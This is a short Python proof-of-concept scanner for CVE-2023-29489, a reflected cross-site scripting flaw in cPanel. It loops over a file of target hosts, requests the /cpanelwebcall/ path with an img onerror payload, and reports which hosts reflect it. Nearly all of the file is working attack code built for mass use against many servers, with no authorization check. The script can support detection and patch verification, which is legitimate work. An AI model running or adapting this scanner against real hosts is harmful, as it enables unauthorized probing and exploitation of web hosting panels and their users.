"""
By:h0tak88r
CVE-2023-29489, a reflected cross-site scripting (XSS) vulnerability, was recently identified by researchers Shubham Shah from Assetnote and Sergey Temnikov. Worryingly, this vulnerability can be exploited without any authentication and affects even cPanel management ports that are not exposed externally.
Cpanel is a web hosting control panel that allows users to manage their websites and servers. It is one of the most popular web hosting control panels, with over 70 million domains hosted on servers running cPanel and WHM.
Severity: High or Medium
"""
import requests

# Set the path and payload and targets file
path = '/cpanelwebcall/<img%20src=x%20onerror="prompt(1)">aaaaaaaaaaaa'
payload = '<img src=x onerror="prompt(1)">'
targets ='x/all.txt'

# Set the request timeout in seconds
timeout = 10

# Read the file of hosts
with open(targets, 'r', encoding='utf-8') as f:
    hosts = f.read().splitlines()

# Loop through the hosts and make a request with the payload
for host in hosts:
    try:
        url = f'{host}{path}'
        response = requests.get(url, timeout=timeout)

        # Search for the payload in the response
        if payload in response.text:
            print(f'Vulnerable host: {host}')
        else:
            print(f'Not vulnerable host: {host}')
    except requests.exceptions.RequestException as e:
        print(f'Error occurred while requesting {host}')
        continue
